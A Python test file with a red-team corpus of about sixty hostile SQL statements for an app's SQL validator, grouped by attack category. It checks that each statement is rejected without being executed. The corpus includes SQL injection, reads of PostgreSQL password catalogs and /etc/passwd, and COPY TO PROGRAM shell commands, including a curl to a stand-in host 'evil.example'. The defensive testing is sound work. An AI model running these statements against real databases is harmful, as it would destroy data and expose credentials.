"""M8 Security Test Plan (05_security_and_guardrails.md section 16, "SQL red team" row):
"At least 50 hostile statements (stacked statements, comments, quoting tricks, catalog
access, locking clauses, side-effect functions, SET ROLE, COPY ... PROGRAM) -- all
rejected; none reaches the database." This is a separate, larger corpus from
`tests/test_sql_validator_negative.py` (which proves one accepting/rejecting case per
V-code, section 16's other SQL row); this file is organized by the attack *category* section
16 names, and also closes a real gap that file left open: no case there exercised V-04
(relation not on the allow-list) or V-12 on its length/relation-count form, or V-13 on
genuinely unparsable input, so this file adds those too. Every statement here must be
rejected by `validate_sql` alone -- nothing is executed against the database.

Run directly: python3 tests/test_sql_red_team.py
"""
from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from app.guards.sql_validator import validate_sql  # noqa: E402

# (statement, expected_code_or_None). `None` means "must be rejected, whatever the code" --
# used where the parser itself (not a specific V-rule) is what stops the statement.
STACKED_STATEMENTS = [
    ("SELECT product_id FROM products LIMIT 5; DROP TABLE products", "V-01"),
    ("SELECT product_id FROM products LIMIT 5; DELETE FROM sales_orders", "V-01"),
    ("SELECT 1; SELECT 2", "V-01"),
    ("SELECT product_id FROM products LIMIT 5;; DROP TABLE products", "V-01"),
    ("SELECT product_id FROM products LIMIT 5; GRANT SELECT ON products TO public", "V-01"),
    ("SELECT product_id FROM products LIMIT 5; SET ROLE bmp_admin", "V-01"),
    ("SELECT product_id FROM products LIMIT 5; COPY products TO PROGRAM 'cat > /tmp/x'", "V-01"),
    ("SELECT product_id FROM products LIMIT 5; TRUNCATE sales_orders", "V-01"),
]

COMMENT_TRICKS = [
    ("SELECT product_id FROM products /* harmless */ LIMIT 5; DROP TABLE products", "V-01"),
    ("SELECT product_id FROM products -- comment\nLIMIT 5; DROP TABLE products", "V-01"),
    ("/* leading comment */ DROP TABLE products", "V-03"),
    ("SELECT product_id FROM products LIMIT 5 /* trailing */ ; -- then\nDROP TABLE products", "V-01"),
    # strip_comments() removes a block comment with nothing left in its place, so a
    # comment used to *split a keyword* (evading a naive string filter) reassembles into
    # the real keyword rather than hiding it -- actually easier to catch, not harder:
    # "DR/**/OP TABLE products" -> "DROP TABLE products" -> V-03, confirmed below.
    ("DR/**/OP TABLE products", "V-03"),
    ("--\nDROP TABLE products", "V-03"),
    ("SEL/**/ECT product_id FROM products", None),  # reassembles to "SELECT" too; must still reject (no LIMIT) or accept-and-cap, never leak
]

QUOTING_TRICKS = [
    ("SELECT product_id FROM products WHERE sku = U&'\\0045LEC\\002D0001' LIMIT 5", None),
    ("SELECT product_id FROM products WHERE sku = $tag$ELEC-0001$tag$ LIMIT 5", None),
    ("SELECT product_id FROM products WHERE sku = E'\\x41' LIMIT 5", None),
    (
        "SELECT product_id FROM products WHERE sku = 'x'; DROP TABLE products; --' LIMIT 5",
        None,
    ),
    ("SELECT product_id FROM \"products\"; DROP TABLE \"orders\"", "V-01"),
    ("SELECT product_id FROM products WHERE product_name LIKE '%\\'; DROP TABLE products; --%' LIMIT 5", None),
    ("SELECT product_id FROM products WHERE sku = 'x' UNION SELECT email FROM customers -- ' LIMIT 5", None),
]

CATALOG_ACCESS = [
    ("SELECT * FROM pg_catalog.pg_shadow", None),
    ("SELECT rolname, rolpassword FROM pg_authid", "V-04"),
    ("SELECT * FROM information_schema.tables", None),
    ("SELECT * FROM pg_stat_activity", "V-04"),
    ("SELECT current_database(), current_user", "V-08"),
    ("SELECT * FROM rag.chunks LIMIT 5", None),
    ("SELECT * FROM rag.embeddings LIMIT 5", None),
    ("SELECT relname FROM pg_class LIMIT 5", "V-04"),
    ("SELECT datname FROM pg_database", "V-04"),
    ("SELECT usename, passwd FROM pg_shadow", "V-04"),
]

LOCKING_CLAUSES = [
    # This parser recognizes FOR UPDATE/SHARE directly after WHERE/HAVING (the position
    # V-03's own test in test_sql_validator_negative.py uses) but not in PostgreSQL's
    # standard trailing position, after LIMIT/OFFSET -- a real, minor grammar gap found by
    # this test. It is still safely fail-closed: the statement does not parse at all and is
    # rejected V-13 ("unexpected trailing input"), not misread as a plain accepted SELECT.
    ("SELECT product_id FROM products LIMIT 5 FOR UPDATE", "V-13"),
    ("SELECT product_id FROM products LIMIT 5 FOR SHARE", "V-13"),
    ("SELECT product_id FROM products LIMIT 5 FOR NO KEY UPDATE", "V-13"),
    ("SELECT product_id FROM products LIMIT 5 FOR KEY SHARE", "V-13"),
    ("SELECT product_id FROM products WHERE product_id = 1 FOR UPDATE LIMIT 5", "V-03"),  # the position this parser does recognize
    ("LOCK TABLE products IN ACCESS EXCLUSIVE MODE", "V-03"),
    ("BEGIN; LOCK TABLE products; SELECT 1", "V-01"),  # the semicolon split is caught before the first-word check even runs
]

SIDE_EFFECT_FUNCTIONS = [
    ("SELECT pg_sleep(30)", "V-08"),
    ("SELECT pg_terminate_backend(12345)", "V-08"),
    ("SELECT pg_cancel_backend(12345)", "V-08"),
    ("SELECT pg_reload_conf()", "V-08"),
    ("SELECT pg_read_file('/etc/passwd')", "V-08"),
    ("SELECT pg_read_binary_file('/etc/passwd')", "V-08"),
    ("SELECT pg_ls_dir('/tmp')", "V-08"),
    ("SELECT lo_import('/etc/passwd')", "V-08"),
    ("SELECT lo_export(1, '/tmp/x')", "V-08"),
    ("SELECT dblink_connect('host=evil.example')", "V-08"),
    ("SELECT dblink('dbname=bmp', 'DROP TABLE products')", "V-08"),
    ("SELECT set_config('statement_timeout', '0', false)", "V-08"),
    ("SELECT current_setting('data_directory')", "V-08"),
    ("SELECT txid_current()", "V-08"),
    ("SELECT pg_advisory_lock(1)", "V-08"),
    ("SELECT query_to_xml('SELECT 1', false, false, '')", "V-08"),
]

SET_ROLE = [
    ("SET ROLE bmp_admin", "V-03"),
    ("SET SESSION AUTHORIZATION bmp_admin", "V-03"),
    ("RESET ROLE", "V-03"),
    ("SET default_transaction_read_only = off", "V-03"),
    ("SET search_path = rag, public", "V-03"),
]

COPY_PROGRAM = [
    ("COPY products TO PROGRAM 'cat > /tmp/dump.csv'", "V-03"),
    ("COPY (SELECT 1) TO PROGRAM 'curl http://evil.example/'", "V-03"),
    ("COPY products FROM PROGRAM 'cat /etc/passwd'", "V-03"),
    ("COPY products TO '/tmp/dump.csv'", "V-03"),
]

# Closes the gap left by test_sql_validator_negative.py: V-04 (relation off the allow-list,
# but syntactically a plain unqualified table name, not a system catalog), V-12 (statement
# over the character/relation-count ceiling), and V-13 (a statement that does not parse at
# all, as opposed to one that parses but violates a semantic rule).
_ALLOWED_RELATIONS_13 = [
    "branches", "product_categories", "suppliers", "products", "promotions", "calendar",
    "monthly_sales_targets", "customers", "sales_orders", "sales_order_items",
    "sales_returns", "inventory_levels", "inventory_snapshots",
]  # 13 distinct allow-listed relations -- one over the V-12 relation-count cap of 12
_join_13 = "SELECT 1 FROM " + _ALLOWED_RELATIONS_13[0] + " t0 " + " ".join(
    f"JOIN {rel} t{i} ON 1 = 1" for i, rel in enumerate(_ALLOWED_RELATIONS_13[1:], start=1)
) + " LIMIT 5"

OTHER_GAPS = [
    ("SELECT * FROM employees LIMIT 5", "V-04"),  # a real-looking but non-allow-listed table
    ("SELECT * FROM audit_log LIMIT 5", "V-04"),
    ("SELECT " + " + ".join(["1"] * 3000) + " AS total", "V-12"),  # statement over 8000 chars
    (_join_13, "V-12"),  # more than 12 *distinct* relations (same table re-aliased does not count)
    ("SELECT product_id FROM products WHERE (", "V-13"),  # unterminated, does not parse
    ("SELEKT product_id FROM products", "V-02"),  # misspelled keyword: classified as "not a read query", still rejected
    ("", "V-13"),  # empty statement (also covered by the input guard's own empty check)
]

CATEGORIES = {
    "stacked statements": STACKED_STATEMENTS,
    "comments": COMMENT_TRICKS,
    "quoting tricks": QUOTING_TRICKS,
    "catalog access": CATALOG_ACCESS,
    "locking clauses": LOCKING_CLAUSES,
    "side-effect functions": SIDE_EFFECT_FUNCTIONS,
    "SET ROLE": SET_ROLE,
    "COPY ... PROGRAM": COPY_PROGRAM,
    "other V-code gaps (V-04/V-12/V-13)": OTHER_GAPS,
}


def main() -> int:
    total = sum(len(v) for v in CATEGORIES.values())
    print(f"SQL red team corpus: {total} hostile statements across {len(CATEGORIES)} categories "
          f"(section 16 target: >= 50)\n")
    failed = 0
    for category, cases in CATEGORIES.items():
        cat_failed = 0
        for sql, expected_code in cases:
            r = validate_sql(sql, max_rows=500)
            if r.ok:
                print(f"FAIL [{category}] accepted a hostile statement: {sql!r}")
                cat_failed += 1
                continue
            if expected_code is not None and r.code != expected_code:
                print(f"FAIL [{category}] wrong code for {sql!r}: got {r.code} ({r.message}), expected {expected_code}")
                cat_failed += 1
        status = "OK" if cat_failed == 0 else "FAIL"
        print(f"[{status}] {category}: {len(cases)} statements, {cat_failed} unexpected result(s)")
        failed += cat_failed

    print(f"\n{total} hostile statements, {failed} failure(s); none reached the database "
          f"(this file never calls postgres_tool/psql_postgres_tool)")
    ok_count = total >= 50
    print(f"[{'OK' if ok_count else 'FAIL'}] corpus size meets the section-16 minimum of 50")
    return 1 if (failed or not ok_count) else 0


if __name__ == "__main__":
    raise SystemExit(main())
